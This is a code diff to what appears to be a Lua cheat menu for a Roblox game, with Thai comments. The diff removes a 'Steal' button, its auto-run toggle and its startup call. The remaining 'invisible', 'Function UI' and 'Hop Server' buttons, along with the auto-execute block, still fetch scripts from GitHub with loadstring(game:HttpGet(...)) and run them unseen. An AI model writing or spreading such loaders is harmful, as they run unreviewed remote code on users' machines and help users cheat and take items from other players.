@@ -34,9 +34,6 @@ local function SaveSettings()
 end
 
 -- ฟังก์ชันแต่ละปุ่ม
-local function RunSteal()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/dthzqq/New-Bypassed/refs/heads/main/SAB"))()
-end
 
 local function Runinvisible()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Chxtoqfee12/Chx-Braintoy/refs/heads/main/steal%20invisible"))()
@@ -58,16 +55,11 @@ local function RunHopServer()
 end
 
 -- สร้างปุ่มปกติ
-local stealBtn = lib:CreateButton(window, "🛠 Steal", RunSteal)
 local invisibleBtn = lib:CreateButton(window, "👻 invisible", Runinvisible)
 local funcBtn = lib:CreateButton(window, "⚙ Function UI", RunFunctionUI)
 local hopBtn = lib:CreateButton(window, "🌍 Hop Server", RunHopServer)
 
 -- สร้าง Toggle สำหรับ Auto Execute
-local toggleSteal = lib:CreateToggle(window, "Auto Steal", AutoExecFuncs.Steal, function(state)
-    AutoExecFuncs.Steal = state
-    SaveSettings()
-end)
 
 local toggleinvisible = lib:CreateToggle(window, "Auto invisible", AutoExecFuncs.invisible, function(state)
     AutoExecFuncs.invisible = state
@@ -86,10 +78,6 @@ end)
 
 -- ฟังก์ชัน Auto Execute ทีละตัวด้วย delay
 task.spawn(function()
-    if AutoExecFuncs.Steal then
-        task.spawn(RunSteal)
-        task.wait(1)
-    end
     if AutoExecFuncs.FunctionUI then
         task.spawn(RunFunctionUI)
         task.wait(1)
